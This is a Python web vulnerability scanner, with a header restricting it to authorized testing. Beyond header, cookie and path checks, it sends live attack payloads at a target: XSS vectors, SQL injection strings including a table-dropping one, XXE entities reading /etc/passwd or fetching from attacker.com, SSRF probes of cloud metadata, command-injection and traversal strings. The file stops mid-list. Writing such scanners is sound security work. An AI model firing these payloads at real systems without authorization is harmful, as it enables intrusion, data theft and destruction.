#!/usr/bin/env python3
"""
Advanced Website Security Integration Testing Tool
CRITICAL WARNING: This tool is for authorized security testing ONLY.
Using this tool without explicit written permission is ILLEGAL and may result in:
- Criminal charges
- Civil lawsuits
- Permanent criminal record
- Significant fines and imprisonment

ONLY use on systems you own or have written authorization to test.
"""

import requests
import re
import ssl
import socket
import base64
import jwt
import hashlib
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin, quote, unquote
import json
from datetime import datetime
import concurrent.futures
import argparse
import sys
import time
import random
import string
import subprocess
import dns.resolver
from typing import List, Dict, Any, Tuple, Optional
import warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class AdvancedSecurityTester:
    def __init__(self, target_url: str, verbose: bool = False, aggressive: bool = False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(self.target_url)
        self.domain = self.parsed_url.netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security-Test-Tool/2.0; +https://github.com/security)'
        })
        self.verbose = verbose
        self.aggressive = aggressive
        self.results = {
            'url': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'warnings': [],
            'info': [],
            'technologies': [],
            'subdomains': []
        }
        self.request_count = 0
        self.rate_limit_delay = 0.5 if not aggressive else 0.1

    def log(self, message: str, level: str = 'INFO'):
        if self.verbose or level in ['ERROR', 'WARNING', 'CRITICAL']:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"[{timestamp}][{level}] {message}")

    def add_finding(self, severity: str, category: str, title: str, description: str, details: Dict = None):
        finding = {
            'severity': severity,
            'category': category,
            'title': title,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'details': details or {}
        }
        
        if severity == 'CRITICAL':
            self.results['vulnerabilities'].append(finding)
            self.log(f"CRITICAL: {title}", 'CRITICAL')
        elif severity == 'HIGH':
            self.results['vulnerabilities'].append(finding)
            self.log(f"HIGH: {title}", 'ERROR')
        elif severity == 'MEDIUM':
            self.results['warnings'].append(finding)
            self.log(f"MEDIUM: {title}", 'WARNING')
        else:
            self.results['info'].append(finding)

    def make_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make rate-limited requests"""
        self.request_count += 1
        if self.request_count % 10 == 0:
            time.sleep(self.rate_limit_delay)
        
        try:
            kwargs.setdefault('timeout', 10)
            kwargs.setdefault('verify', False)
            kwargs.setdefault('allow_redirects', False)
            
            response = self.session.request(method, url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            self.log(f"Request error: {str(e)}", 'ERROR')
            return None

    def test_technology_fingerprinting(self):
        """Advanced technology fingerprinting"""
        self.log("Performing technology fingerprinting...")
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
        
        technologies = []
        
        # Headers fingerprinting
        header_signatures = {
            'X-Powered-By': lambda v: f"Powered by: {v}",
            'Server': lambda v: f"Server: {v}",
            'X-AspNet-Version': lambda v: f"ASP.NET Version: {v}",
            'X-AspNetMvc-Version': lambda v: f"ASP.NET MVC Version: {v}",
            'X-Generator': lambda v: f"Generator: {v}",
        }
        
        for header, parser in header_signatures.items():
            if header in response.headers:
                tech = parser(response.headers[header])
                technologies.append(tech)
                self.add_finding('LOW', 'Fingerprinting', 'Technology Disclosure',
                               tech, {'header': header, 'value': response.headers[header]})
        
        # Content fingerprinting
        content = response.text
        
        # CMS Detection
        cms_signatures = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
            'Joomla': ['/components/', '/modules/', 'Joomla!'],
            'Drupal': ['/sites/default/', 'Drupal.settings', '/misc/drupal.js'],
            'Magento': ['/skin/frontend/', 'Mage.Cookies', '/js/mage/'],
            'Shopify': ['cdn.shopify.com', 'shopify-features'],
            'Laravel': ['laravel_session', 'XSRF-TOKEN'],
            'Django': ['csrfmiddlewaretoken', '__admin_media_prefix__'],
            'Ruby on Rails': ['authenticity_token', 'rails-'],
            'Angular': ['ng-app', 'angular.js', 'ng-controller'],
            'React': ['react', '_jsx', 'reactroot'],
            'Vue.js': ['v-for', 'v-if', 'vue.js']
        }
        
        for cms, signatures in cms_signatures.items():
            for sig in signatures:
                if sig in content:
                    technologies.append(f"CMS/Framework: {cms}")
                    self.log(f"Detected {cms}", 'INFO')
                    break
        
        # JavaScript library detection
        js_libs = re.findall(r'(?:src|href)=["\']([^"\']*\.(?:js|css)[^"\']*)["\'"]', content)
        for lib in js_libs:
            if 'jquery' in lib.lower():
                match = re.search(r'jquery[.-]?([\d.]+)', lib.lower())
                if match:
                    technologies.append(f"jQuery {match.group(1)}")
            elif 'bootstrap' in lib.lower():
                match = re.search(r'bootstrap[.-]?([\d.]+)', lib.lower())
                if match:
                    technologies.append(f"Bootstrap {match.group(1)}")
        
        self.results['technologies'] = list(set(technologies))

    def test_ssl_tls(self):
        """Test SSL/TLS configuration"""
        self.log("Testing SSL/TLS configuration...")
        
        if not self.target_url.startswith('https://'):
            self.add_finding('HIGH', 'SSL/TLS', 'No HTTPS', 
                           'Website is not using HTTPS encryption')
            return

        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.parsed_url.hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.parsed_url.hostname) as ssock:
                    cert = ssock.getpeercert()
                    protocol = ssock.version()
                    cipher = ssock.cipher()
                    
                    # Check protocol version
                    if protocol in ['TLSv1', 'TLSv1.1']:
                        self.add_finding('HIGH', 'SSL/TLS', 'Outdated TLS Version',
                                       f'Server supports outdated {protocol}',
                                       {'protocol': protocol})
                    elif protocol == 'TLSv1.2':
                        self.add_finding('INFO', 'SSL/TLS', 'TLS Version',
                                       f'Server uses {protocol} (consider upgrading to TLSv1.3)',
                                       {'protocol': protocol})
                    
                    # Check cipher strength
                    if cipher:
                        cipher_name = cipher[0]
                        if 'RC4' in cipher_name or 'DES' in cipher_name:
                            self.add_finding('HIGH', 'SSL/TLS', 'Weak Cipher',
                                           f'Server uses weak cipher: {cipher_name}',
                                           {'cipher': cipher_name})
                    
                    # Certificate validation
                    if cert:
                        self.log(f"SSL/TLS Protocol: {protocol}", 'INFO')
                        if cipher:
                            self.log(f"Cipher Suite: {cipher[0]}", 'INFO')
        except ssl.SSLError as e:
            self.add_finding('HIGH', 'SSL/TLS', 'SSL/TLS Error',
                           f'SSL/TLS configuration error: {str(e)}')
        except Exception as e:
            self.add_finding('HIGH', 'SSL/TLS', 'SSL/TLS Error',
                           f'Error testing SSL/TLS: {str(e)}')

    def test_security_headers(self):
        """Test for security headers"""
        self.log("Testing security headers...")
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        headers = response.headers
        
        # Critical security headers
        security_headers = {
            'Strict-Transport-Security': ('HIGH', 'Missing HSTS header - allows protocol downgrade attacks'),
            'X-Content-Type-Options': ('MEDIUM', 'Missing X-Content-Type-Options - allows MIME type sniffing'),
            'X-Frame-Options': ('MEDIUM', 'Missing X-Frame-Options - vulnerable to clickjacking'),
            'Content-Security-Policy': ('MEDIUM', 'Missing CSP - no protection against XSS and injection attacks'),
            'X-XSS-Protection': ('LOW', 'Missing X-XSS-Protection header (deprecated but still useful)'),
            'Referrer-Policy': ('LOW', 'Missing Referrer-Policy - may leak sensitive information'),
            'Permissions-Policy': ('LOW', 'Missing Permissions-Policy - no feature restrictions'),
            'X-Permitted-Cross-Domain-Policies': ('LOW', 'Missing cross-domain policy restrictions')
        }
        
        for header, (severity, message) in security_headers.items():
            if header not in headers:
                self.add_finding(severity, 'Headers', f'Missing {header}', message)
            else:
                # Validate header values
                value = headers[header]
                self.log(f"Found {header}: {value[:100]}...", 'INFO')
                
                # HSTS validation
                if header == 'Strict-Transport-Security':
                    if 'max-age' not in value:
                        self.add_finding('MEDIUM', 'Headers', 'Invalid HSTS',
                                       'HSTS header missing max-age directive')
                    elif 'max-age=0' in value:
                        self.add_finding('HIGH', 'Headers', 'HSTS Disabled',
                                       'HSTS is effectively disabled with max-age=0')
                
                # CSP validation
                if header == 'Content-Security-Policy':
                    if 'unsafe-inline' in value or 'unsafe-eval' in value:
                        self.add_finding('MEDIUM', 'Headers', 'Weak CSP',
                                       'CSP allows unsafe inline scripts or eval',
                                       {'csp': value[:200]})
        
        # Check for information disclosure headers
        info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
        for header in info_headers:
            if header in headers:
                self.add_finding('LOW', 'Headers', f'Information Disclosure: {header}',
                               f'Header reveals server information: {headers[header]}',
                               {'header': header, 'value': headers[header]})
        
        # Check for security headers with bad values
        if 'Access-Control-Allow-Origin' in headers:
            acao = headers['Access-Control-Allow-Origin']
            if acao == '*':
                acac = headers.get('Access-Control-Allow-Credentials', 'false')
                severity = 'HIGH' if acac == 'true' else 'MEDIUM'
                self.add_finding(severity, 'Headers', 'Permissive CORS',
                               'Access-Control-Allow-Origin set to wildcard',
                               {'acao': acao, 'credentials': acac})

    def test_common_paths(self):
        """Test for exposed sensitive paths"""
        self.log("Testing common sensitive paths...")
        
        sensitive_paths = [
            # Version control
            ('/.git/', 'Git repository exposed'),
            ('/.git/config', 'Git configuration exposed'),
            ('/.svn/', 'SVN repository exposed'),
            ('/.hg/', 'Mercurial repository exposed'),
            
            # Configuration files
            ('/.env', 'Environment configuration exposed'),
            ('/config.php', 'PHP configuration exposed'),
            ('/wp-config.php', 'WordPress configuration exposed'),
            ('/configuration.php', 'Joomla configuration exposed'),
            ('/settings.py', 'Django settings exposed'),
            ('/config.json', 'JSON configuration exposed'),
            ('/config.yaml', 'YAML configuration exposed'),
            ('/database.yml', 'Database configuration exposed'),
            
            # Server configuration
            ('/.htaccess', 'Apache configuration exposed'),
            ('/.htpasswd', 'Password file exposed'),
            ('/web.config', 'IIS configuration exposed'),
            ('/nginx.conf', 'Nginx configuration exposed'),
            
            # IDE and development
            ('/.vscode/', 'VSCode workspace exposed'),
            ('/.idea/', 'IntelliJ project files exposed'),
            ('/.DS_Store', 'macOS metadata exposed'),
            ('/Thumbs.db', 'Windows metadata exposed'),
            
            # Package managers
            ('/package.json', 'NPM package file exposed'),
            ('/composer.json', 'Composer package file exposed'),
            ('/requirements.txt', 'Python requirements exposed'),
            ('/Gemfile', 'Ruby dependencies exposed'),
            
            # Build and deployment
            ('/Dockerfile', 'Docker configuration exposed'),
            ('/docker-compose.yml', 'Docker Compose configuration exposed'),
            ('/.gitlab-ci.yml', 'GitLab CI configuration exposed'),
            ('/.travis.yml', 'Travis CI configuration exposed'),
            ('/Jenkinsfile', 'Jenkins configuration exposed'),
            
            # Documentation and info
            ('/README.md', 'README file exposed'),
            ('/LICENSE', 'License file exposed'),
            ('/CHANGELOG.md', 'Changelog exposed'),
            ('/TODO.txt', 'TODO list exposed'),
            
            # Logs and debugging
            ('/debug.log', 'Debug log exposed'),
            ('/error.log', 'Error log exposed'),
            ('/access.log', 'Access log exposed'),
            ('/logs/', 'Log directory exposed'),
            
            # Backup files
            ('/backup/', 'Backup directory exposed'),
            ('/backups/', 'Backups directory exposed'),
            ('/db_backup.sql', 'Database backup exposed'),
            ('/dump.sql', 'Database dump exposed'),
            
            # Admin interfaces
            ('/admin/', 'Admin panel accessible'),
            ('/administrator/', 'Administrator panel accessible'),
            ('/phpmyadmin/', 'phpMyAdmin accessible'),
            ('/adminer/', 'Adminer accessible'),
            ('/wp-admin/', 'WordPress admin accessible'),
            
            # API documentation
            ('/swagger.json', 'Swagger API documentation exposed'),
            ('/api-docs/', 'API documentation exposed'),
            ('/graphql', 'GraphQL endpoint exposed'),
            
            # Other sensitive paths
            ('/robots.txt', 'Robots file (may reveal hidden paths)'),
            ('/sitemap.xml', 'Sitemap (reveals site structure)'),
            ('/crossdomain.xml', 'Cross-domain policy file'),
            ('/.well-known/', 'Well-known directory exposed'),
            ('/server-status', 'Apache server status exposed'),
            ('/server-info', 'Apache server info exposed'),
        ]
        
        found_paths = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for path, description in sensitive_paths:
                url = urljoin(self.target_url, path)
                futures.append(executor.submit(self._check_path_advanced, url, path, description))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found_paths.append(result)
        
        # Group findings by severity
        critical_paths = [p for p in found_paths if p['severity'] == 'CRITICAL']
        high_paths = [p for p in found_paths if p['severity'] == 'HIGH']
        medium_paths = [p for p in found_paths if p['severity'] == 'MEDIUM']
        info_paths = [p for p in found_paths if p['severity'] == 'INFO']
        
        if critical_paths:
            self.add_finding('CRITICAL', 'Paths', 'Critical Files Exposed',
                           'Highly sensitive files are publicly accessible',
                           {'paths': critical_paths})
        
        if high_paths:
            self.add_finding('HIGH', 'Paths', 'Sensitive Files Exposed',
                           'Sensitive files are publicly accessible',
                           {'paths': high_paths})
        
        if medium_paths:
            self.add_finding('MEDIUM', 'Paths', 'Configuration Files Exposed',
                           'Configuration files are publicly accessible',
                           {'paths': medium_paths})
        
        if info_paths and self.verbose:
            self.add_finding('INFO', 'Paths', 'Information Disclosure',
                           'Informational files are accessible',
                           {'paths': info_paths})

    def _check_path_advanced(self, url: str, path: str, description: str) -> Dict:
        """Advanced path checking with severity assessment"""
        try:
            response = self.make_request('GET', url)
            if response and response.status_code == 200:
                content_length = len(response.content)
                content_type = response.headers.get('Content-Type', '')
                
                # Determine severity based on path type
                severity = 'INFO'
                if any(critical in path for critical in ['.git/', '.env', 'config.php', 'wp-config.php', '.htpasswd', 'database.yml']):
                    severity = 'CRITICAL'
                elif any(high in path for high in ['.git', '.svn', 'backup', 'dump.sql', 'admin/', 'phpmyadmin']):
                    severity = 'HIGH'
                elif any(medium in path for medium in ['package.json', 'composer.json', '.htaccess', 'Dockerfile']):
                    severity = 'MEDIUM'
                
                self.log(f"Found exposed path: {path} ({severity})", 'WARNING' if severity in ['CRITICAL', 'HIGH'] else 'INFO')
                
                return {
                    'path': path,
                    'url': url,
                    'description': description,
                    'status': response.status_code,
                    'size': content_length,
                    'content_type': content_type,
                    'severity': severity
                }
        except:
            pass
        return None

    def test_cookie_security(self):
        """Test cookie security attributes"""
        self.log("Testing cookie security...")
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        if not response.cookies:
            self.log("No cookies found in response", 'INFO')
            return
        
        for cookie in response.cookies:
            issues = []
            details = {
                'name': cookie.name,
                'value_length': len(cookie.value),
                'domain': cookie.domain,
                'path': cookie.path
            }
            
            # Check Secure flag
            if not cookie.secure and self.target_url.startswith('https://'):
                issues.append('Missing Secure flag (transmitted over HTTP)')
            
            # Check HttpOnly flag
            if 'httponly' not in cookie._rest:
                issues.append('Missing HttpOnly flag (accessible via JavaScript)')
            
            # Check SameSite attribute
            same_site = cookie.get_nonstandard_attr('SameSite')
            if not same_site:
                issues.append('Missing SameSite attribute (CSRF risk)')
            elif same_site.lower() == 'none' and not cookie.secure:
                issues.append('SameSite=None without Secure flag')
            
            # Check cookie name for session identifiers
            session_names = ['session', 'sess', 'sid', 'jsessionid', 'phpsessid', 'asp.net_sessionid']
            is_session = any(name in cookie.name.lower() for name in session_names)
            
            # Check cookie entropy (for session cookies)
            if is_session and len(cookie.value) < 32:
                issues.append(f'Weak session ID (only {len(cookie.value)} characters)')
            
            # Check for sensitive data in cookies
            if self._contains_sensitive_data(cookie.value):
                issues.append('Potentially contains sensitive data')
            
            if issues:
                severity = 'HIGH' if is_session and len(issues) > 1 else 'MEDIUM'
                self.add_finding(severity, 'Cookies', f'Insecure Cookie: {cookie.name}',
                               f'Cookie has security issues: {", ".join(issues)}',
                               {**details, 'issues': issues})

    def _contains_sensitive_data(self, value: str) -> bool:
        """Check if cookie value might contain sensitive data"""
        # Look for patterns that might indicate sensitive data
        sensitive_patterns = [
            r'password',
            r'secret',
            r'api[_-]?key',
            r'token',
            r'bearer',
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email
            r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',  # Credit card
        ]
        
        value_lower = value.lower()
        for pattern in sensitive_patterns:
            if re.search(pattern, value_lower):
                return True
        
        # Check if it looks like base64 encoded data that might be sensitive
        try:
            if len(value) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in value):
                decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                for pattern in sensitive_patterns:
                    if re.search(pattern, decoded.lower()):
                        return True
        except:
            pass
        
        return False

    def test_csrf_protection(self):
        """Test for CSRF protection"""
        self.log("Testing CSRF protection...")
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        forms = self._extract_forms(response.text)
        
        # CSRF token patterns
        csrf_patterns = [
            r'csrf[_-]?token',
            r'authenticity[_-]?token',
            r'__RequestVerificationToken',
            r'csrfmiddlewaretoken',
            r'_token',
            r'xsrf[_-]?token',
            r'anti[_-]?forgery[_-]?token'
        ]
        
        # Check meta tags for CSRF tokens
        meta_csrf = False
        for pattern in csrf_patterns:
            if re.search(rf'<meta[^>]*name=["\']?{pattern}["\']?[^>]*>', response.text, re.IGNORECASE):
                meta_csrf = True
                self.log("Found CSRF token in meta tag", 'INFO')
                break
        
        # Check each form
        vulnerable_forms = []
        for form in forms:
            if form['method'] == 'POST':
                has_csrf = False
                
                # Check form inputs for CSRF token
                for input_name in form['inputs']:
                    for pattern in csrf_patterns:
                        if re.match(pattern, input_name, re.IGNORECASE):
                            has_csrf = True
                            break
                    if has_csrf:
                        break
                
                # Check if form might rely on meta CSRF token
                if not has_csrf and not meta_csrf:
                    # Check if it's a sensitive form
                    action = form.get('action', '').lower()
                    sensitive_actions = ['password', 'email', 'delete', 'update', 'change', 'admin', 'settings', 'profile']
                    is_sensitive = any(word in action for word in sensitive_actions)
                    
                    vulnerable_forms.append({
                        'action': form.get('action', '/'),
                        'inputs': len(form['inputs']),
                        'sensitive': is_sensitive
                    })
        
        if vulnerable_forms:
            sensitive_forms = [f for f in vulnerable_forms if f['sensitive']]
            if sensitive_forms:
                self.add_finding('HIGH', 'CSRF', 'Missing CSRF Protection (Sensitive Forms)',
                               f'{len(sensitive_forms)} sensitive POST forms lack CSRF tokens',
                               {'forms': sensitive_forms})
            else:
                self.add_finding('MEDIUM', 'CSRF', 'Missing CSRF Protection',
                               f'{len(vulnerable_forms)} POST forms lack CSRF tokens',
                               {'forms': vulnerable_forms[:5]})  # Limit to first 5

    def test_subdomain_enumeration(self):
        """Enumerate subdomains"""
        if not self.aggressive:
            self.log("Skipping subdomain enumeration (requires --aggressive flag)")
            return
            
        self.log("Enumerating subdomains...")
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'administrator', 'api', 'app',
            'dev', 'development', 'stage', 'staging', 'test', 'testing',
            'prod', 'production', 'beta', 'demo', 'portal', 'secure',
            'vpn', 'remote', 'webmail', 'ns1', 'ns2', 'smtp', 'pop', 'imap',
            'blog', 'shop', 'store', 'forum', 'support', 'help', 'docs',
            'documentation', 'cdn', 'static', 'assets', 'images', 'img',
            'videos', 'media', 'files', 'download', 'downloads'
        ]
        
        found_subdomains = []
        base_domain = self.domain.split(':')[0]  # Remove port if present
        
        for subdomain in common_subdomains:
            try:
                full_domain = f"{subdomain}.{base_domain}"
                answers = dns.resolver.resolve(full_domain, 'A')
                if answers:
                    ips = [str(rdata) for rdata in answers]
                    found_subdomains.append({
                        'subdomain': full_domain,
                        'ips': ips
                    })
                    self.log(f"Found subdomain: {full_domain} -> {ips}", 'INFO')
            except:
                pass
        
        if found_subdomains:
            self.results['subdomains'] = found_subdomains
            self.add_finding('INFO', 'Reconnaissance', 'Subdomains Found',
                           f'Found {len(found_subdomains)} subdomains',
                           {'subdomains': found_subdomains})

    def test_advanced_xss(self):
        """Advanced XSS testing with multiple contexts and encodings"""
        self.log("Testing advanced XSS vulnerabilities...")
        
        # Advanced XSS payloads for different contexts
        xss_payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "';alert(1);//",
            ],
            'event_handlers': [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
            ],
            'javascript_uri': [
                '<a href="javascript:alert(1)">click</a>',
                '<iframe src="javascript:alert(1)">',
            ],
            'encoded': [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
                '\x3cscript\x3ealert(1)\x3c/script\x3e',
            ],
            'dom_based': [
                '#<script>alert(1)</script>',
                '?default=<script>alert(1)</script>',
            ],
            'polyglot': [
                r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcLick=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
            ]
        }
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        forms = self._extract_forms(response.text)
        
        # Test each form with different payload categories
        for form in forms:
            for category, payloads in xss_payloads.items():
                for payload in payloads:
                    if self._test_xss_in_form(form, payload, category):
                        self.add_finding('CRITICAL', 'XSS', f'XSS Vulnerability ({category})',
                                       f'Form at {form.get("action", "/")} vulnerable to {category} XSS',
                                       {'form': form, 'payload': payload, 'category': category})
                        break
        
        # Test URL parameters
        self._test_reflected_xss_in_url()

    def _test_reflected_xss_in_url(self):
        """Test for reflected XSS in URL parameters"""
        test_params = ['q', 'search', 'query', 'id', 'page', 'name', 'view', 'action']
        xss_payload = '<script>alert(1)</script>'
        
        for param in test_params:
            url = f"{self.target_url}?{param}={quote(xss_payload)}"
            response = self.make_request('GET', url)
            
            if response and xss_payload in response.text:
                self.add_finding('CRITICAL', 'XSS', 'Reflected XSS in URL',
                               f'Parameter {param} reflects user input without encoding',
                               {'parameter': param, 'url': url})

    def test_advanced_sql_injection(self):
        """Advanced SQL injection testing"""
        self.log("Testing advanced SQL injection vulnerabilities...")
        
        # Advanced SQL injection payloads
        sql_payloads = {
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' ORDER BY 1--+",
                "1' ORDER BY 100--+",
            ],
            'blind_boolean': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                "' GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; CREATE TABLE test(id INT)--",
            ],
            'second_order': [
                "admin'--",
                "admin' /*",
            ]
        }
        
        # Database-specific error messages
        db_errors = {
            'MySQL': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'mysqli_fetch_array'
            ],
            'PostgreSQL': [
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wpg_',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'PSQLException'
            ],
            'MSSQL': [
                r'Microsoft.*ODBC.*SQL',
                r'SqlException',
                r'Incorrect syntax near',
                r'Unclosed quotation mark'
            ],
            'Oracle': [
                r'ORA-[0-9]{5}',
                r'Oracle.*ERROR',
                r'SQL command not properly ended'
            ],
            'SQLite': [
                r'SQLite.*error',
                r'sqlite3.OperationalError',
                r'SQLite3::SQLException'
            ]
        }
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        forms = self._extract_forms(response.text)
        
        for form in forms:
            for category, payloads in sql_payloads.items():
                for payload in payloads:
                    result = self._test_sql_injection_advanced(form, payload, db_errors)
                    if result:
                        self.add_finding('CRITICAL', 'SQL Injection', f'SQL Injection ({category})',
                                       f'Form vulnerable to {category} SQL injection',
                                       {'form': form, 'payload': payload, 
                                        'database': result['database'],
                                        'error': result['error']})

    def _test_sql_injection_advanced(self, form: Dict, payload: str, db_errors: Dict) -> Optional[Dict]:
        """Test for SQL injection with database detection"""
        try:
            url = urljoin(self.target_url, form['action'])
            data = {input_name: payload for input_name in form['inputs']}
            
            if form['method'] == 'POST':
                response = self.make_request('POST', url, data=data)
            else:
                response = self.make_request('GET', url, params=data)
            
            if not response:
                return None
                
            # Check for database-specific errors
            for db_type, error_patterns in db_errors.items():
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {'database': db_type, 'error': pattern}
                        
            # Check for blind SQL injection (timing-based)
            if 'SLEEP' in payload or 'WAITFOR' in payload:
                start_time = time.time()
                response2 = self.make_request('POST' if form['method'] == 'POST' else 'GET',
                                            url, data=data if form['method'] == 'POST' else None,
                                            params=data if form['method'] == 'GET' else None)
                elapsed = time.time() - start_time
                
                if elapsed > 4:  # If request took more than 4 seconds
                    return {'database': 'Unknown', 'error': 'Time-based blind SQL injection'}
                    
        except Exception as e:
            self.log(f"Error in SQL injection test: {str(e)}", 'ERROR')
        
        return None

    def test_xxe_injection(self):
        """Test for XML External Entity (XXE) injection"""
        self.log("Testing XXE vulnerabilities...")
        
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            
            # Blind XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<root>&xxe;</root>''',
            
            # XXE via DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test SYSTEM "http://attacker.com/evil.dtd">
<root></root>''',
        ]
        
        # Find XML endpoints
        xml_endpoints = self._find_xml_endpoints()
        
        for endpoint in xml_endpoints:
            for payload in xxe_payloads:
                response = self.make_request('POST', endpoint,
                                           data=payload,
                                           headers={'Content-Type': 'application/xml'})
                
                if response and ('root:' in response.text or 'java.io.FileNotFoundException' in response.text):
                    self.add_finding('CRITICAL', 'XXE', 'XML External Entity Injection',
                                   f'Endpoint {endpoint} is vulnerable to XXE',
                                   {'endpoint': endpoint, 'payload': payload[:100] + '...'})

    def test_ssrf(self):
        """Test for Server-Side Request Forgery"""
        self.log("Testing SSRF vulnerabilities...")
        
        ssrf_payloads = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://169.254.169.254/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:25/',
            'dict://127.0.0.1:11211/',
            'http://0.0.0.0/',
            'http://[::1]/',
        ]
        
        # Common parameters that might be vulnerable to SSRF
        ssrf_params = ['url', 'uri', 'path', 'file', 'document', 'page', 
                      'remote', 'load', 'retrieve', 'fetch', 'src', 'href',
                      'action', 'redirect', 'position', 'location']
        
        for param in ssrf_params:
            for payload in ssrf_payloads:
                # Test GET
                url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.make_request('GET', url)
                
                if response and self._check_ssrf_indicators(response, payload):
                    self.add_finding('HIGH', 'SSRF', 'Server-Side Request Forgery',
                                   f'Parameter {param} may be vulnerable to SSRF',
                                   {'parameter': param, 'payload': payload})

    def _check_ssrf_indicators(self, response: requests.Response, payload: str) -> bool:
        """Check for SSRF indicators in response"""
        indicators = [
            'root:x:0:0:',  # /etc/passwd
            'AWS_SECRET_ACCESS_KEY',  # AWS metadata
            'nameserver',  # /etc/resolv.conf
            '127.0.0.1',
            'localhost',
        ]
        
        return any(indicator in response.text for indicator in indicators)

    def test_command_injection(self):
        """Test for OS command injection"""
        self.log("Testing command injection vulnerabilities...")
        
        # Command injection payloads for different OS
        cmd_payloads = {
            'linux': [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(whoami)',
                '; cat /etc/passwd',
                '& timeout 5',
            ],
            'windows': [
                '& dir',
                '| whoami',
                '& ping -n 5 127.0.0.1',
                '& type C:\\Windows\\win.ini',
            ],
            'universal': [
                '; sleep 5',
                '| sleep 5',
                '`sleep 5`',
                '$(sleep 5)',
            ]
        }
        
        # Parameters commonly vulnerable to command injection
        cmd_params = ['cmd', 'exec', 'command', 'execute', 'ping', 'query',
                     'file', 'upload', 'dir', 'path']
        
        for param in cmd_params:
            for category, payloads in cmd_payloads.items():
                for payload in payloads:
                    url = f"{self.target_url}?{param}={quote(payload)}"
                    
                    # Time-based detection for sleep payloads
                    if 'sleep' in payload:
                        start_time = time.time()
                        response = self.make_request('GET', url)
                        elapsed = time.time() - start_time
                        
                        if elapsed > 4:
                            self.add_finding('CRITICAL', 'Command Injection', 
                                           'OS Command Injection (Time-based)',
                                           f'Parameter {param} is vulnerable to command injection',
                                           {'parameter': param, 'payload': payload})
                    else:
                        response = self.make_request('GET', url)
                        if response and self._check_command_injection_output(response, category):
                            self.add_finding('CRITICAL', 'Command Injection',
                                           'OS Command Injection',
                                           f'Parameter {param} executes OS commands',
                                           {'parameter': param, 'payload': payload})

    def _check_command_injection_output(self, response: requests.Response, os_type: str) -> bool:
        """Check for command execution output"""
        if os_type == 'linux':
            patterns = ['uid=', 'gid=', 'root:x:', 'bin/bash', 'total ']
        elif os_type == 'windows':
            patterns = ['Volume in drive', 'Directory of', 'Windows\\']
        else:
            patterns = []
        
        return any(pattern in response.text for pattern in patterns)

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        self.log("Testing directory traversal vulnerabilities...")
        
        # Directory traversal payloads
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
